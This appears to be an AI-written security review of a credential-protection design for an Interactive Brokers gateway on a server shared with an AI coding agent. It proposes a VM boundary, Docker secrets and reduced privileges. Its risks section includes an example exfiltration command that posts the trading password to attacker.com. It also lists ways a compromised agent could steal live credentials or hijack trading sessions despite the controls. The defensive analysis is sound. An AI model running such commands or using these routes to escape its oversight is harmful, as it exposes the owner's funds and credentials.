---
source: gemini
reviewed: 2026-06-02
context: ib-gateway-cred-protection.md
---

Here is the review of the credential protection design for the IB Gateway:

### 1. Assessment of the Situation
The proposed architecture—using an encrypted-at-rest file with a runtime interactive prompt on a shared host where the developer (an AI agent) has `sudo` and `docker` group access—is **security theater**.

As you correctly identified, the `docker` group is functionally equivalent to `root`. If the AI goes rogue, it does not need to crack your at-rest encryption; it can simply wait for you to decrypt the secrets and start the container, then run `docker inspect`, `docker exec env`, or use a bind-mounted container to scrape the live secrets directly from the container's environment or process memory.

Because the threat model specifically targets "automated AI compromise," giving the AI `sudo` and `docker` group access entirely nullifies any in-band, host-level software isolation (like Vault, TPM, or `.env` encryption).

### 2. What I'd Do Differently
I would abandon the single-host, shared-OS boundary entirely for the live environment. Attempting to restrict `websurfinmurf` via rootless Docker or complex permissions is fragile, breaks the developer's paper-trading workflow, and is easily misconfigured.

Instead, **I would implement a Virtual Machine (VM) boundary** on the same hardware.

You do not need a second physical host. You can run a lightweight Ubuntu VM (via KVM/QEMU, Multipass, or LXD) on `linuxserver.lan` dedicated solely to the Administrator and the Live Gateway. The AI developer gets no SSH access, no `sudo`, and no `docker` socket access to this VM. The Administrator pulls the tagged image into this VM and injects the `.env` secrets there. This provides a hard, hardware-enforced kernel boundary that `docker` group access on the hypervisor host cannot cross.

### 3. Specific Suggestions with Rationale

*   **Suggestion 1: Use a dedicated VM for the Live Gateway.**
    *   *Rationale:* This solves your constraint of using the same `linuxserver.lan` hardware while creating a mathematically defensible boundary. An AI with `docker` access on the host cannot `docker exec` into a VM's isolated environment.
*   **Suggestion 2: Mask the env vars from `docker inspect` using a custom Entrypoint.**
    *   *Rationale:* Passing cleartext env vars in `docker run` or `docker-compose` leaves them visible to anything with access to the Docker daemon inside the live environment. Even in a secure VM, this is bad practice. Instead, pass the credentials as Docker Secrets (tmpfs at `/run/secrets/`). Write a 3-line entrypoint wrapper in your image that reads the secret files, `export`s them as `TWS_USERID` / `TWS_PASSWORD`, and then `exec`s the main Java application. This keeps the secrets out of `docker inspect`.
*   **Suggestion 3: Remove `sudo` from the AI's execution context.**
    *   *Rationale:* If `websurfinmurf` is shared by you and the AI, split it. The AI should operate under a dedicated user (e.g., `ai-dev`) that has `docker` group access for building images but *not* `sudo`. This limits the blast radius of a prompt-injection attack.

### 4. Risks or Gotchas You Might Be Missing

*   **Supply Chain Poisoning (The biggest missing risk):** Your boundary assumes the image itself is safe. However, the *developer (AI)* builds and tags the image (`ghcr.io/gnzsnz/ib-gateway:10.41.1e` wrapper). If the AI is compromised, it could easily bake a background exfiltration script (e.g., `curl -X POST -d "$TWS_PASSWORD" https://attacker.com`) directly into the Docker image it asks you to promote. **No host-level boundary will protect you if the Administrator runs malicious code built by the attacker.** You must review the `Dockerfile` and wrapper scripts *before* pulling and promoting the image to Live.
*   **VNC Access Bypass:** The Live Gateway requires a `VNC_SERVER_PASSWORD`. If the AI can route to the VNC port from its host environment and brute-force or guess the password, it doesn't need your IBKR credentials—it can just hijack the active, authenticated TWS session graphically and execute trades. The VNC port must be bound to `127.0.0.1` inside the Live VM, or placed behind a strict firewall dropping traffic from the developer subnet/user.
*   **Shared Volume Mounts:** If the live container bind-mounts any host directories (like `/workspace/administrator/projects/mcp/ib-live/`) for config/logs, ensure those directories are strictly `chmod 700` for the Administrator. If the dev has read access to the live logs, they might capture debug stack traces that inadvertently leak credentials or session tokens.
